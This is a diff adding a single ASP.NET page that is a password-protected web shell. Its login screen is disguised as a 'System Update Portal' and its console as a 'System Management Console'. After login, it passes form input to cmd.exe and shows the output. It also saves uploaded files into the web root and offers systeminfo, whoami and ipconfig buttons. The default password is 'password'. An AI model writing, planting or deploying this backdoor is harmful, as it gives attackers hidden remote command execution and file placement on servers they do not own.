@@ -1,0 +1,180 @@
+<%@ Page Language="C#" Debug="false" Trace="false" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System.Text" %>
+<script runat="server">
+    // Configuration - CHANGE THESE VALUES
+    private string passwordHash = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"; // SHA256 of "password"
+    private string sessionKey = "AUTH_" + GetHash("session_salt");
+    
+    // Simple SHA256 helper
+    private static string GetHash(string input) {
+        using (var sha256 = SHA256.Create()) {
+            return BitConverter.ToString(sha256.ComputeHash(Encoding.UTF8.GetBytes(input))).Replace("-", "").ToLower();
+        }
+    }
+    
+    void Page_Load(object sender, EventArgs e) {
+        Response.Cache.SetCacheability(HttpCacheability.NoCache);
+        
+        if (!IsPostBack) {
+            Session[sessionKey] = null;
+        }
+        
+        if (IsAuthenticated()) {
+            HandleAuthenticatedRequest();
+        } else {
+            ShowLoginForm();
+        }
+    }
+    
+    bool IsAuthenticated() {
+        return Session[sessionKey] != null && (bool)Session[sessionKey];
+    }
+    
+    void ShowLoginForm() {
+        string loginForm = @"
+            <!DOCTYPE html>
+            <html>
+            <head><title>System Update</title>
+            <style>body{font-family:Arial;max-width:500px;margin:50px auto;padding:20px}</style>
+            </head>
+            <body>
+                <h3>System Update Portal</h3>
+                <form method='post'>
+                    <input type='password' name='pwd' placeholder='Enter update key' style='padding:8px;width:200px;' />
+                    <input type='submit' value='Authenticate' style='padding:8px 15px;' />
+                    <input type='hidden' name='auth' value='1' />
+                </form>
+            </body>
+            </html>";
+        Response.Write(loginForm);
+        Response.End();
+    }
+    
+    void HandleAuthenticatedRequest() {
+        if (Request.Form["cmd"] != null) {
+            ExecuteCommand(Request.Form["cmd"]);
+        } else if (Request.Files.Count > 0) {
+            HandleFileUpload();
+        } else {
+            ShowShellInterface();
+        }
+    }
+    
+    void ExecuteCommand(string command) {
+        try {
+            var process = new System.Diagnostics.Process();
+            process.StartInfo.FileName = "cmd.exe";
+            process.StartInfo.Arguments = "/c " + command;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.CreateNoWindow = true;
+            
+            process.Start();
+            
+            string output = process.StandardOutput.ReadToEnd();
+            string error = process.StandardError.ReadToEnd();
+            process.WaitForExit();
+            
+            Response.Write("<pre style='background:#f0f0f0;padding:10px;border-radius:5px;'>" + 
+                          Server.HtmlEncode(output + error) + "</pre>");
+        } catch (Exception ex) {
+            Response.Write("<div style='color:red;'>Error: " + Server.HtmlEncode(ex.Message) + "</div>");
+        }
+    }
+    
+    void HandleFileUpload() {
+        HttpPostedFile file = Request.Files[0];
+        if (file != null && file.ContentLength > 0) {
+            string fileName = Path.GetFileName(file.FileName);
+            string savePath = Server.MapPath("~/") + fileName;
+            
+            try {
+                file.SaveAs(savePath);
+                Response.Write("<div style='color:green;'>File uploaded successfully: " + fileName + "</div>");
+            } catch (Exception ex) {
+                Response.Write("<div style='color:red;'>Upload failed: " + ex.Message + "</div>");
+            }
+        }
+    }
+    
+    void ShowShellInterface() {
+        string interfaceHtml = @"
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>System Management</title>
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+                    .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; }
+                    .section { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 3px; }
+                    input, textarea, button { padding: 8px; margin: 5px 0; }
+                    input[type='text'], textarea { width: 70%; }
+                    button { background: #007cba; color: white; border: none; cursor: pointer; }
+                </style>
+            </head>
+            <body>
+                <div class='container'>
+                    <h3>System Management Console</h3>
+                    
+                    <div class='section'>
+                        <h4>Command Execution</h4>
+                        <form method='post'>
+                            <input type='text' name='cmd' placeholder='Enter command (e.g., dir, whoami)' />
+                            <button type='submit'>Execute</button>
+                        </form>
+                    </div>
+                    
+                    <div class='section'>
+                        <h4>File Upload</h4>
+                        <form method='post' enctype='multipart/form-data'>
+                            <input type='file' name='file' />
+                            <button type='submit'>Upload File</button>
+                        </form>
+                    </div>
+                    
+                    <div class='section'>
+                        <h4>System Info</h4>
+                        <form method='post'>
+                            <button type='submit' name='cmd' value='systeminfo'>Get System Info</button>
+                            <button type='submit' name='cmd' value='whoami'>Current User</button>
+                            <button type='submit' name='cmd' value='ipconfig'>Network Info</button>
+                        </form>
+                    </div>
+                    
+                    <div style='text-align:right;'>
+                        <a href='?logout=1' style='color:red;'>Logout</a>
+                    </div>
+                </div>
+            </body>
+            </html>";
+        
+        Response.Write(interfaceHtml);
+    }
+    
+    void btnLogin_Click(object sender, EventArgs e) {
+        string enteredPassword = Request.Form["pwd"];
+        if (GetHash(enteredPassword) == passwordHash) {
+            Session[sessionKey] = true;
+            Response.Redirect(Request.Url.AbsolutePath);
+        } else {
+            Response.Write("<div style='color:red;margin:10px;'>Invalid credentials</div>");
+            ShowLoginForm();
+        }
+    }
+</script>
+
+<%
+    // Handle authentication check
+    if (Request.Form["auth"] != null) {
+        btnLogin_Click(null, null);
+    }
+    
+    // Handle logout
+    if (Request.QueryString["logout"] != null) {
+        Session[sessionKey] = null;
+        Response.Redirect(Request.Url.AbsolutePath);
+    }
+%>
